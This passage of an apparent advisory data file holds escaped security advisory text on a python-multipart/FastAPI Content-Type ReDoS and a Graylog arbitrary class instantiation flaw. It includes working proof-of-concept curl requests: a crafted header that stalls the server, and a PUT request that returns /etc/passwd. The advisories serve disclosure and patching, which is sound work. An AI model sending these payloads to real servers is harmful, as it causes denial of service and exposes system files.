query](https:&#x2F;&#x2F;codeql.github.com&#x2F;codeql-query-help&#x2F;javascript&#x2F;js-reflected-xss&#x2F;).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-218` or `GHSL-2023-219` in any communication regarding these issues.\n\n## Disclosure Policy\n\nThis report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https:&#x2F;&#x2F;securitylab.github.com&#x2F;advisories#policy).",

            "details": "<b>python-multipart vulnerable to Content-Type Header ReDoS</b><br>### Summary\n\nWhen using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.\n\nAn attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can&#x27;t handle any more requests.\n\nThis can create a ReDoS (Regular expression Denial of Service): https:&#x2F;&#x2F;owasp.org&#x2F;www-community&#x2F;attacks&#x2F;Regular_expression_Denial_of_Service_-_ReDoS\n\nThis only applies when the app uses form data, parsed with `python-multipart`.\n\n### Details\n\nA regular HTTP `Content-Type` header could look like:\n\n```\nContent-Type: text&#x2F;html; charset=utf-8\n```\n\n`python-multipart` parses the option with this RegEx: https:&#x2F;&#x2F;github.com&#x2F;andrew-d&#x2F;python-multipart&#x2F;blob&#x2F;d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a&#x2F;multipart&#x2F;multipart.py#L72-L74\n\nA custom option could be made and sent to the server to break it with:\n\n```\nContent-Type: application&#x2F;x-www-form-urlencoded; !=\\&quot;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\n```\n\n### PoC\n\nCreate a simple WSGI application, that just parses the `Content-Type`, and run it with `python main.py`:\n\n```Python\n# main.py\nfrom wsgiref.simple_server import make_server\nfrom wsgiref.validate import validator\n\nfrom multipart.multipart import parse_options_header\n\n\ndef simple_app(environ, start_response):\n    _, _ = parse_options_header(environ[&quot;CONTENT_TYPE&quot;])\n\n    start_response(&quot;200 OK&quot;, [(&quot;Content-type&quot;, &quot;text&#x2F;plain&quot;)])\n    return [b&quot;Ok&quot;]\n\n\nhttpd = make_server(&quot;&quot;, 8123, validator(simple_app))\nprint(&quot;Serving on port 8123...&quot;)\nhttpd.serve_forever()\n```\n\nThen send the attacking request with:\n\n```console\n$ curl -v -X &#x27;POST&#x27; -H $&#x27;Content-Type: application&#x2F;x-www-form-urlencoded; !=\\&quot;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&#x27; --data-binary &#x27;input=1&#x27; &#x27;http:&#x2F;&#x2F;localhost:8123&#x2F;&#x27;\n```\n\n### Impact\n\nIt&#x27;s a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data. This way it also affects other libraries using Starlette, like FastAPI.\n\n### Original Report\n\nThis was originally reported to FastAPI as an email to security@tiangolo.com, sent via https:&#x2F;&#x2F;huntr.com&#x2F;, the original reporter is Marcello, https:&#x2F;&#x2F;github.com&#x2F;byt3bl33d3r\n\n&amp;lt;details&amp;gt;\n&amp;lt;summary&amp;gt;Original report to FastAPI&amp;lt;&#x2F;summary&amp;gt;\n\nHey Tiangolo!\n\nMy name&#x27;s Marcello and I work on the ProtectAI&#x2F;Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).\n\nHere are the details: I&#x27;m using the latest version of FastAPI (0.109.0) and the following code:\n\n```Python\nfrom typing import Annotated\nfrom fastapi.responses import HTMLResponse\nfrom fastapi import FastAPI,Form\nfrom pydantic import BaseModel\n\nclass Item(BaseModel):\n    username: str\n\napp = FastAPI()\n\n@app.get(&quot;&#x2F;&quot;, response_class=HTMLResponse)\nasync def index():\n    return HTMLResponse(&quot;Test&quot;, status_code=200)\n\n@app.post(&quot;&#x2F;submit&#x2F;&quot;)\nasync def submit(username: Annotated[str, Form()]):\n    return {&quot;username&quot;: username}\n\n@app.post(&quot;&#x2F;submit_json&#x2F;&quot;)\nasync def submit_json(item: Item):\n    return {&quot;username&quot;: item.username}\n```\n\nI&#x27;m running the above with uvicorn with the following command:\n\n```console\nuvicorn server:app\n```\n\nThen run the following cUrl command:\n\n```\ncurl -v -X &#x27;POST&#x27; -H $&#x27;Content-Type: application&#x2F;x-www-form-urlencoded; !=\\&quot;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&#x27; --data-binary &#x27;input=1&#x27; &#x27;http:&#x2F;&#x2F;localhost:8000&#x2F;submit&#x2F;&#x27;\n```\n\nYou&#x27;ll see the server locks up, is unable to serve anymore requests and one CPU core is pegged to 100%\n\nYou can even start uvicorn with multiple workers with the --workers 4 argument and as long as you send (workers + 1) requests you&#x27;ll completely DoS the FastApi server.\n\nIf you try submitting Json to the &#x2F;submit_json endpoint with the malicious Content-Type header you&#x27;ll see it isn&#x27;t vulnerable. So this only affects FastAPI when it parses Form data.\n\nCheers\n\n#### Impact\n\nAn attacker is able to cause a DoS on a FastApi server via a malicious Content-Type header if it parses Form data.\n\n#### Occurrences\n\n[params.py L586](https:&#x2F;&#x2F;github.com&#x2F;tiangolo&#x2F;fastapi&#x2F;blob&#x2F;d74b3b25659b42233a669f032529880de8bd6c2d&#x2F;fastapi&#x2F;params.py#L586)\n\n&amp;lt;&#x2F;details&amp;gt;",

api/releases/tag/0.109.1</a></li></ul>"

            "details": "<b>Graylog vulnerable to instantiation of arbitrary classes triggered by API request</b><br>### Summary\n\nArbitrary classes can be loaded and instantiated using a HTTP PUT request to the `&#x2F;api&#x2F;system&#x2F;cluster_config&#x2F;` endpoint.\n\n### Details\n\nGraylog&#x27;s cluster config system uses fully qualified class names as config keys. To validate the existence of the requested class before using them, Graylog loads the class using the class loader. \n\nhttps:&#x2F;&#x2F;github.com&#x2F;Graylog2&#x2F;graylog2-server&#x2F;blob&#x2F;e458db8bf4f789d4d19f1b37f0263f910c8d036c&#x2F;graylog2-server&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;graylog2&#x2F;rest&#x2F;resources&#x2F;system&#x2F;ClusterConfigResource.java#L208-L214\n\n\n### PoC\nA request of the following form will output the content of the `&#x2F;etc&#x2F;passwd` file:\n\n```\ncurl -u admin:&amp;lt;admin-password&amp;gt; -X PUT http:&#x2F;&#x2F;localhost:9000&#x2F;api&#x2F;system&#x2F;cluster_config&#x2F;java.io.File \\\n    -H &quot;Content-Type: application&#x2F;json&quot; \\\n    -H &quot;X-Requested-By: poc&quot; \\\n    -d &#x27;&quot;&#x2F;etc&#x2F;passwd&quot;&#x27;\n```\n\nTo perform the request, authorization is required. Only users posessing the `clusterconfigentry:create` and `clusterconfigentry:edit` permissions are allowed to do so. These permissions are usually only granted to `Admin` users.\n\n### Impact\n\nIf a user with the appropriate permissions performs the request, arbitrary classes with 1-arg String constructors can be instantiated. \n\nThis will execute arbitrary code that is run during class instantiation.\n\nIn the specific use case of `java.io.File`, the behaviour of the internal web-server stack will lead to information exposure by including the entire file content in the response to the REST request.\n\n### Credits\n\nAnalysis provided by Fabian Yamaguchi - Whirly Labs (Pty) Ltd",
